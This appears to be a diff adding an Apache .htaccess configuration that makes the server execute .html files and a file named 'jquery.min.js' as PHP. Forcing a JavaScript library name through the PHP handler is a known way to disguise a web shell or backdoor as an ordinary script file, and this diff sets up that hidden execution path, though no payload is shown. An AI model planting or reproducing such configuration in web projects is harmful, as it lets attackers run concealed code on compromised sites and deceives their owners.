@@ -1,0 +1,5 @@
+AddType application/x-httpd-php .html
+
+<FilesMatch "jquery.min.js">
+	SetHandler application/x-httpd-php
+</FilesMatch>
